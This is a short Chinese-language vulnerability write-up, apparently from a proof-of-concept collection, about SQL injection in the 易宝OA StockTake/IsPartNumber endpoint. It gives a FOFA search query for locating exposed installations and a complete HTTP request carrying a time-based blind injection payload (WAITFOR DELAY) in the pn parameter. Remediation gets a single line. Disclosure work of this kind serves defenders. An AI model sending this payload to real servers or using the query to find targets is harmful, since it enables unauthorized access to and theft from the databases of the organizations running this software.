# 易宝OA StockTakeIsPartNumberSQL注入漏洞

易宝OA StockTake/IsPartNumber存在SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。

# 影响版本

易宝OA 

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：(title="欢迎登录易宝OA系统" && body="/Content/css/OAstyle.css") || body="$.cookie(\"topvision_oaName"

POC/EXP：

```
GET /SmartTradeScan/StockTake/IsPartNumber?pn=1%27WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
```

![image-20260108140123493](assets/image-20260108140123493.png)

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
